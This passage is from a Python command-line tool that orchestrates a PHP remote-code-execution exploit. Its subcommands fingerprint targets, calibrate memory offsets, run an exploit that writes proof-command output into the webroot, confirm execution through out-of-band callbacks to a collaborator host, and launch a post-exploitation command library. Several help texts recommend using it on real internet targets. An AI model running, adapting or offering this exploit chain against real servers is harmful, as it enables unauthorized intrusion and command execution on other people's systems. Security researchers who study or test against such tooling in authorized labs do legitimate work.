            src += "+cli:%s" % k2
    prof["_src"] = src
    return prof


def oneclick_stop_exit(rc, verdict):
    """When scan already returned a "do not continue" verdict, return the exit code to propagate; otherwise None."""
    if rc in (20, 30, 40, 50):
        return rc
    v = (verdict or "").upper()
    if v in ("SAFE", "PATCHED", "NOT_AFFECTED_OR_PATCHED"):
        return 30
    if v == "UNREACHABLE":
        return 50
    if v == "AFFECTED_DOS_ONLY":
        return 20
    if v in ("NO_SINK", "NOSINK", "NO_SESSION_SINK", "BLOCKED"):
        return 40
    return None


def do_oneclick(a):
    """One command: fingerprint -> precondition check -> calibrate (optional) -> exploit/blind verify -> post-exploitation (optional) -> report."""
    url = a.url.rstrip("/") + "/"

    outdir = a.outdir or os.path.join(".", "oneclick_%s" % re.sub(r"\W+", "_", url)[:40])
    os.makedirs(outdir, exist_ok=True)
    rep = {"target": url, "started": time.strftime("%Y-%m-%dT%H:%M:%S"),
           "steps": [], "verdict": None, "rce": False, "exit": None, "artifacts": {}}

    def log(msg):
        print(msg, flush=True)

    # ---------- 1. read-only fingerprint + precondition check (reuses php2shell.py scan, writes json)
    log("[1/5] fingerprint + precondition check ...")
    scan_json = os.path.join(outdir, "scan.json")
    cmd = [sys.executable, TOOL, "scan", "-u", url, "--json", "-o", scan_json,
           "--timeout", "%.1f" % a.timeout]
    if a.max_mb:
        cmd += ["--max-mb", str(a.max_mb)]
    if getattr(a, "stage1_n", None):
        cmd += ["--stage1-n", str(a.stage1_n)]
    if getattr(a, "rate", None):
        cmd += ["--rate", str(a.rate)]
    rc1, out1 = _run(cmd)
    scan = _load_json(scan_json) or {}
    ver = (scan.get("verdict") or ("rc%d" % rc1)).upper()
    _st = scan.get("steps") or {}
    _fp = _st.get("fingerprint") or {}
    _sinks = _st.get("sinks") or []
    rep["php_version"] = _fp.get("php_version") or scan.get("php_version")
    rep["server"] = _fp.get("server") or scan.get("server")
    rep["precondition"] = scan.get("precondition") or scan.get("pre")
    rep["sink"] = (_sinks[0].get("path") if _sinks else None) or _fp.get("sink_candidate")
    rep["steps"].append({"step": "scan", "rc": rc1, "verdict": ver,
                         "php_version": rep["php_version"], "server": rep["server"]})
    log("      PHP=%s  Server=%s" % (rep["php_version"], rep["server"]))
    log("      precondition=%s  sink=%s" % (rep["precondition"], rep["sink"]))
    log("      verdict=%s (rc=%d)" % (ver, rc1))
    rep["verdict"] = ver

    # scan's exit code already gives a hard "do not continue": do not burn another exploit round into a timeout
    #   20=AFFECTED_DOS_ONLY / 30=NOT_AFFECTED_OR_PATCHED / 40=NO_SESSION_SINK / 50=UNREACHABLE
    stop = oneclick_stop_exit(rc1, ver)
    if stop is not None:
        rep["exit"] = stop
        _oneclick_finish(rep, outdir)
        return stop

    # Version is already outside the official fixed matrix -> report SAFE directly, run no OOM probe
    if _is_patched(rep["php_version"]):
        rep["verdict"] = "PATCHED_BY_VERSION(%s)" % ver
        rep["exit"] = 30
        log("      version %s is at or above the fixed threshold -> PATCHED, stopping probes" % rep["php_version"])
        _oneclick_finish(rep, outdir)
        return 30

    # DoS only / preconditions only: do not enter the attack phase
    if "DOS_ONLY" in ver or "DOS-ONLY" in ver:
        rep["exit"] = 20
        _oneclick_finish(rep, outdir)
        return 20
    if "PREMISES_ONLY" in ver and not getattr(a, "force", False):
        rep["exit"] = 15
        log("      only the preconditions are met (OOM not verified): add --force to enter the attack phase anyway")
        _oneclick_finish(rep, outdir)
        return 15

    # ---------- 2. profile selection
    prof = _pick_profile(rep, a)
    rep["profile"] = {k: (hex(v) if isinstance(v, int) and k.endswith("offset") else v)
                      for k, v in prof.items() if not k.startswith("_")}
    rep["profile_source"] = prof.get("_src")
    rep["cap"] = cmd_cap(prof)
    log("[2/5] profile=%s  cap=%dB" % (rep["profile_source"], rep["cap"]))
    if prof.get("_needs_cal") and not a.force:
        log("      [!] this profile only has symbols offsets; ht_size/htdata_offset are still base values.")
        log("          run calibrate in an environment with the same build first, or pass --force explicitly (not recommended, that is blind hitting).")
        rep["verdict"] = "NEEDS_CALIBRATION"
        rep["exit"] = 15
        _oneclick_finish(rep, outdir)
        return 15
    if prof.get("_db_rce_ok") is False and not (a.profile or a.zif_offset or a.dtor_offset):
        log("      [!] this build is known to lack an infoleak primitive: %s" % prof.get("_db_label", ""))
        rep["verdict"] = "AFFECTED_DOS_ONLY"
        rep["exit"] = 20
        _oneclick_finish(rep, outdir)
        return 20

    # ---------- 3. attack: with collab use blind verification; with a writable dir use proof-dir; otherwise calibrate first
    attack_mode = None
    if a.collab:
        attack_mode = "blind"                      # out-of-band callback: first choice on real targets, no writable target needed
    elif getattr(a, "http_read", None):
        attack_mode = "httpread"                   # relative write into webroot + HTTP readback: no mount and no egress needed
    elif a.dir and a.local_dir:
        attack_mode = "writeback"                  # locally readable directory (lab/container mount)
    if attack_mode is None:
        log("[3/5] no evidence channel: pass --collab HOST:PORT (out-of-band callback, most universal)"
            " / --http-read https://t/ (target webroot writable) / --dir+--local-dir (locally readable)")
        rep["steps"].append({"step": "attack", "skipped": "no-oracle"})
        rep["exit"] = 10
        _oneclick_finish(rep, outdir)
        return 10

    if (a.calibrate or getattr(a, "auto_cal", False)) and a.collab:
        log("[3/5] calibrating htdata_offset with the callback oracle ...")
        cmd = [sys.executable, os.path.abspath(__file__), "calibrate", "-u", url,
               "--ht-size", str(prof["ht_size"]), "--collab", a.collab,
               "--rounds", str(a.rounds), "--pause", str(a.pause),
               "--out", os.path.join(outdir, "profile_cal.json")]
        if getattr(a, "auto_cal", False):
            cmd += ["--htdata-window", a.calib_window, "--htdata-step", a.calib_step]
        elif a.htdata_offset:
            cmd += ["--htdata-window", "%#x:%#x" % (prof["htdata_offset"], prof["htdata_offset"])]
        rcc, outc = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "calibrate", "rc": rcc})
        log("      calibrate rc=%d" % rcc)
        cal = _load_json(os.path.join(outdir, "profile_cal.json"))
        if cal:
            prof.update({k: v for k, v in cal.items() if v is not None})
            rep["calibrated"] = True

    log("[4/5] attack (%s) ..." % attack_mode)
    if attack_mode == "blind":
        cmd = [sys.executable, os.path.abspath(__file__), "blind", "-u", url,
               "--collab", a.collab, "--token", a.token,
               "--rounds", str(a.rounds), "--pause", str(a.pause),
               "--listen-port", str(a.listen_port)]
        if a.listen:
            cmd += ["--listen"]
        if a.profile:
            cmd += ["--profile", a.profile]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "blind", "rc": rca})
        rep["rce"] = (rca == 0)
        rep["artifacts"]["blind_log"] = os.path.join(outdir, "blind.log")
        with io.open(rep["artifacts"]["blind_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        for ln in outa.splitlines():
            if "callback" in ln or "rc=" in ln:
                log("      " + ln.strip())
    elif attack_mode == "httpread":
        base = a.http_read.rstrip("/")
        _cap = cmd_cap(prof)
        _nm = "p%d" % (int(time.time()) % 1000)
        if len(("id>" + _nm).encode()) > _cap:
            _nm = "o%d" % (int(time.time()) % 10)
        proof_cmd = a.cmd or ("id>" + _nm)
        if len(proof_cmd.encode()) > _cap:
            proof_cmd = "id>" + _nm
            log("      [!] custom command exceeds cap, falling back to: %s" % proof_cmd)
        read_url = "%s/%s" % (base, _nm)
        rep["proof_cmd"] = proof_cmd
        rep["proof_url"] = read_url
        log("      proof command: %s (%dB / cap %dB) -> %s"
            % (proof_cmd, len(proof_cmd.encode()), _cap, read_url))
        cmd = [sys.executable, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php2shell.py"), "exploit", "-u", url,
               "-c", proof_cmd,
               "--zif-offset", "%#x" % prof["zif_offset"],
               "--dtor-offset", "%#x" % prof["dtor_offset"],
               "--htdata-offset", "%#x" % prof["htdata_offset"],
               "--ht-size", str(prof["ht_size"]),
               "--stage2-t", str(prof.get("stage2_t", 406)),
               "--timeout", "120",
               "--rounds", str(a.rounds)]
        if prof.get("stage1_n"):
            cmd += ["--stage1-n", str(prof["stage1_n"])]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "exploit", "rc": rca})
        rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
        with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        body = _http_get(read_url) or ""
        baseline = _http_get(base.rstrip("/") + "/p2s-nx-%d"
                             % (int(time.time() * 1000) % 10 ** 8)) or ""
        expect = r"uid=\d+" if proof_cmd.startswith("id") else None
        ok = bool(body) and body.strip() != baseline.strip() and (
            expect is None or re.search(expect, body) is not None)
        rep["rce"] = ok
        rep["proof_body"] = (body or "")[:200]
        log("      HTTP readback %s -> %s" % (read_url, "hit" if ok else "miss"))
        if not ok:
            log("      [!] possible causes: webroot not writable / cwd is not the webroot / readback path blocked")
    else:
        _cap = cmd_cap(prof)
        _nm = "o%03d" % (int(time.time()) % 1000)
        proof_cmd = a.cmd or ("id>%s/%s" % (a.dir.rstrip("/"), _nm))
        if len(proof_cmd.encode()) > _cap:
            _min = "id>%s/o" % a.dir.rstrip("/")
            log("      [!] custom command %dB exceeds cap=%dB, falling back to the minimal proof command: %s"
                % (len(proof_cmd.encode()), _cap, _min))
            proof_cmd = _min
        rep["proof_cmd"] = proof_cmd
        log("      proof command: %s (%dB / cap %dB)" % (proof_cmd, len(proof_cmd.encode()), _cap))
        cmd = [sys.executable, TOOL, "exploit", "-u", url, "-c", proof_cmd,
               "--zif-offset", hex(prof["zif_offset"]),
               "--dtor-offset", hex(prof["dtor_offset"]),
               "--htdata-offset", hex(prof["htdata_offset"]),
               "--ht-size", str(prof["ht_size"]),
               "--stage2-t", str(prof.get("stage2_t", 406)),
               "--timeout", "120",
               "--rounds", str(a.rounds), "--proof-dir", a.local_dir]
        if prof.get("stage1_n"):
            cmd += ["--stage1-n", str(prof["stage1_n"])]
        rca, outa = _run(cmd, timeout=3600)
        rep["steps"].append({"step": "exploit", "rc": rca, "cmd": proof_cmd})
        # rc=0 only means "this run wrote a new proof file"; verify the local readback content as well
        _out = proof_cmd.rsplit(">", 1)[-1].strip()
        _pf = os.path.join(a.local_dir, os.path.basename(_out))
        _content = b""
        try:
            with open(_pf, "rb") as _f:
                _content = _f.read()
        except OSError:
            pass
        _expect = b"uid=" if proof_cmd.startswith("id") else b""
        rep["rce"] = bool(rca == 0 and _content and _expect in _content)
        rep["proof_body"] = _content.decode("utf-8", "replace")[:200]
        rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
        with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
            f.write(outa)
        for ln in outa.splitlines():
            if "Stage" in ln or "proof" in ln or ln.startswith("uid="):
                log("      " + ln.strip())
    log("      RCE=%s" % ("YES" if rep["rce"] else "NO"))
    rep["scan_verdict"] = rep["verdict"]
    rep["verdict"] = "RCE_CONFIRMED" if rep["rce"] else "LIKELY_RCE_NOT_VERIFIED"

    # ---------- 5. optional post-exploitation
    if rep["rce"] and a.postex:
        log("[5/5] post-exploitation forensics ...")
        cmd = [sys.executable, os.path.abspath(__file__), "postex", "-u", url,
               "--ht-size", str(prof["ht_size"]),
               "--htdata-offset", hex(prof["htdata_offset"]),
               "--zif-offset", hex(prof["zif_offset"]),
               "--dtor-offset", hex(prof["dtor_offset"]),
               "--rounds", str(a.rounds), "--outdir", os.path.join(outdir, "postex")]
        if a.dir and a.local_dir:
            cmd += ["--dir", a.dir, "--local-dir", a.local_dir]
        if a.profile:
            cmd += ["--profile", a.profile]
        if getattr(a, "only", None):
            cmd += ["--only", a.only]
        if getattr(a, "tries", None):
            cmd += ["--tries", str(a.tries)]
        rcp, outp = _run(cmd, timeout=7200)
        rep["postex_rc"] = rcp
        rep["steps"].append({"step": "postex", "rc": rcp})
        rep["artifacts"]["postex_dir"] = os.path.join(outdir, "postex")
        log("      postex rc=%d" % rcp)
    else:
        log("[5/5] post-exploitation: skipped (%s)" % ("no RCE obtained" if not rep["rce"] else "--postex not given"))

    rep["exit"] = 0 if rep["rce"] else 10
    _oneclick_finish(rep, outdir)
    return rep["exit"]


def _oneclick_finish(rep, outdir):
    rep["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S")
    path = os.path.join(outdir, "oneclick_report.json")
    with io.open(path, "w", encoding="utf-8") as f:
        json.dump(rep, f, ensure_ascii=False, indent=1)
    print("--- oneclick verdict ---")
    print("target      : %s" % rep["target"])
    print("php_version : %s" % rep.get("php_version"))
    print("verdict     : %s" % rep.get("verdict"))
    print("rce         : %s" % ("YES" if rep.get("rce") else "NO"))
    print("exit        : %s" % rep.get("exit"))
    print("report      : %s" % path)


def do_recon(a):
    """Delegate to attack/recon.py (real-site recon: grading of the four preconditions version/sink/landing point/offset)."""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import recon
    argv = ["-u", a.url]
    if a.insecure:
        argv.append("--insecure")
    if a.entries:
        argv += ["--entries", a.entries]
    if a.deep:
        argv += ["--deep", "--probe-sizes", a.probe_sizes,
                 "--budget", str(a.budget), "--delay", str(a.delay)]
    if getattr(a, "fast", False):
        argv.append("--fast")
    if a.json:
        argv.append("--json")
    if a.ua:
        argv += ["--ua", a.ua]
    argv += ["--timeout", str(a.timeout)]
    if getattr(a, "verbose", False):
        argv.append("-v")
    return recon.main(argv)


def main():
    try:
        import_profile_store(verbose=True)
    except Exception:
        pass
    ap = argparse.ArgumentParser(description="php2shell extension: symbol derivation + cross-version calibration + post-exploitation")
    sub = ap.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("symbols", help="derive zif/dtor offsets from the libphp.so symbol table")
    s.add_argument("--elf")
    s.add_argument("--docker", help="container name[:path inside the container]")
    s.add_argument("--out")
    s.set_defaults(func=do_symbols)

    b = sub.add_parser("blind", help="blind verification: prove command execution via an out-of-band callback (for real internet targets with no readback channel)")
    b.add_argument("-u", "--url", required=True)
    b.add_argument("--profile")
    b.add_argument("--ht-size", type=int)
    b.add_argument("--zif-offset", type=lambda x: int(x, 0))
    b.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    b.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    b.add_argument("--stage2-t", type=int)
    b.add_argument("--collab", required=True, help="collaborator, e.g. h:9000 (must fit within the command capacity)")
    b.add_argument("--token", default="p1", help="callback path token (2 characters or fewer saves the most bytes)")
    b.add_argument("--listen", action="store_true", default=True)
    b.add_argument("--no-listen", dest="listen", action="store_false")
    b.add_argument("--listen-port", type=int, default=9000)
    b.add_argument("--rounds", type=int, default=8)
    b.add_argument("--pause", type=float, default=0.6)
    b.add_argument("--wait", type=float, default=10)
    b.add_argument("--timeout", type=float, default=90)
    b.set_defaults(func=do_blind)

    f = sub.add_parser("fingerprint", help="read-only fingerprinting: version/exposure check that does not trigger OOM")
    f.add_argument("-u", "--url", required=True)
    f.add_argument("--max-paths", type=int, default=5)
    f.add_argument("--timeout", type=float, default=10)
    f.set_defaults(func=do_fingerprint)

    c = sub.add_parser("calibrate", help="calibrate ht_size / htdata_offset / stage2_t")
    c.add_argument("-u", "--url", required=True)
    c.add_argument("--profile")
    c.add_argument("--ht-size", type=int)
    c.add_argument("--ht-size-lo", type=int, default=151)
    c.add_argument("--ht-size-hi", type=int, default=215)
    c.add_argument("--ht-size-step", type=int, default=8)
    c.add_argument("--htdata-window", help="e.g. 0x680000:0x700000")
    c.add_argument("--htdata-step", type=lambda x: int(x, 0), default=0x100)
    c.add_argument("--zif-offset", type=lambda x: int(x, 0))
    c.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    c.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    c.add_argument("--stage1-n", type=int)
    c.add_argument("--stage2-t", type=int)
    c.add_argument("--rounds", type=int, default=8)
    c.add_argument("--tries", type=int, default=2)
    c.add_argument("--pause", type=float, default=0.6, help="seconds to pause after each attempt")
    c.add_argument("--dir", help="absolute directory channel (e.g. /out), requires --local-dir")
    c.add_argument("--local-dir", dest="local_dir", help="local/host directory corresponding to --dir")
    c.add_argument("--out")
    c.add_argument("--collab", help="out-of-band callback oracle: collab looks like h:9000 (no readback channel needed)")
    c.add_argument("--listen-port", type=int, default=9000)
    c.set_defaults(func=do_calibrate)

    p = sub.add_parser("postex", help="post-RCE attack command library (≤14B)")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--profile")
    p.add_argument("--ht-size", type=int)
    p.add_argument("--zif-offset", type=lambda x: int(x, 0))
    p.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    p.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    p.add_argument("--stage2-t", type=int)
    p.add_argument("--only")
    p.add_argument("--rounds", type=int, default=8)
    p.add_argument("--tries", type=int, default=3)
    p.add_argument("--dir", help="absolute writable directory channel (e.g. /out or /tmp), requires --local-dir for readback")
    p.add_argument("--local-dir", dest="local_dir", help="local/host directory corresponding to --dir")
    p.add_argument("--pause", type=float, default=0.6)
    p.add_argument("--outdir")
    p.add_argument("--cleanup", action="store_true")
    p.set_defaults(func=do_postex)


    p = sub.add_parser("oneclick", help="one command: fingerprint->preconditions->calibrate->exploit/blind verify->post-exploitation->report")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--collab", help="out-of-band callback collaborator host:port (recommended on the internet, no writable target directory needed)")
    p.add_argument("--token", default="p1", help="callback path token (default p1)")
    p.add_argument("--listen", action="store_true", help="automatically start the callback listener locally")
    p.add_argument("--listen-port", dest="listen_port", type=int, default=9000)
    p.add_argument("--calibrate", action="store_true", help="calibrate htdata_offset with the callback oracle first")
    p.add_argument("--http-read", dest="http_read", metavar="BASEURL",
                   help="preferred channel on real targets: write relatively into the webroot, then read back through this, e.g. https://t/")
    p.add_argument("--dir", help="absolute writable directory on the target (e.g. /out), pair with --local-dir for readback")
    p.add_argument("--local-dir", dest="local_dir", help="local directory corresponding to --dir")
    p.add_argument("--cmd", help="custom proof command (default id><--dir>/oneclick_<ts>)")
    p.add_argument("--auto-calibrate", dest="auto_cal", action="store_true",
                   help="auto-sweep the htdata window to calibrate on unknown builds (causes several OOMs)")
    p.add_argument("--calib-window", dest="calib_window", default="0x68000:0x6C000")
    p.add_argument("--calib-step", dest="calib_step", default="0x100")
    p.add_argument("--tries", type=int, default=3, help="retries per postex command (default 3)")
    p.add_argument("--force", action="store_true", help="skip the PREMISES_ONLY early exit and attack anyway (confirm the preconditions yourself)")
    p.add_argument("--postex", action="store_true", help="run post-exploitation forensics automatically after RCE")
    p.add_argument("--only", help="run only the given postex items (comma separated, e.g. id,env,ps)")
    p.add_argument("--profile")
    p.add_argument("--ht-size", type=int)
    p.add_argument("--zif-offset", type=lambda x: int(x, 0))
    p.add_argument("--dtor-offset", type=lambda x: int(x, 0))
    p.add_argument("--htdata-offset", type=lambda x: int(x, 0))
    p.add_argument("--stage1-n", type=int)
    p.add_argument("--stage2-t", type=int)
    p.add_argument("--rounds", type=int, default=8)
    p.add_argument("--pause", type=float, default=0.4)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--max-mb", dest="max_mb", type=int, default=24)
    p.add_argument("--rate", type=float, default=0)
    p.add_argument("--outdir")
    p.set_defaults(func=do_oneclick)

    p = sub.add_parser("recon",
                       help="real-site recon: multi-version evidence + session sink + landing point + offset matching (read-only by default)")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--entries", default="", help="custom entry list (comma separated)")
    p.add_argument("--deep", action="store_true",
                   help="enable landing-point probing (growing-size multipart; may cause 5xx, requires authorization)")
    p.add_argument("--fast", action="store_true",
                   help="fast mode: home page version only + at most 2 sink entries (2-3 requests), skip the large-body probing")
    p.add_argument("--probe-sizes", dest="probe_sizes", default="0.5,1,2,4,8,16")
    p.add_argument("--budget", type=int, default=6)
    p.add_argument("--delay", type=float, default=1.0)
    p.add_argument("--json", action="store_true")
    p.add_argument("--ua")
    p.add_argument("--timeout", type=float, default=12.0)
    p.add_argument("-v", "--verbose", action="store_true")
    p.set_defaults(func=do_recon)

    # add --insecure to every subcommand uniformly (needed for https labs with self-signed/expired certificates)
    for _sp in sub.choices.values():
        if not any(a.dest == "insecure" for a in _sp._actions):
            _sp.add_argument("--insecure", action="store_true",
                             help="skip TLS certificate verification for https targets (self-signed labs); strict by default")

    a = ap.parse_args()
    if getattr(a, "insecure", False):
        import os as _os
        _os.environ["PHP2SHELL_INSECURE"] = "1"
        try:
            import poc_109618 as _P
            _P.DEFAULT_INSECURE = True
        except Exception:
            pass
    sys.exit(a.func(a))


if __name__ == "__main__":
    main()
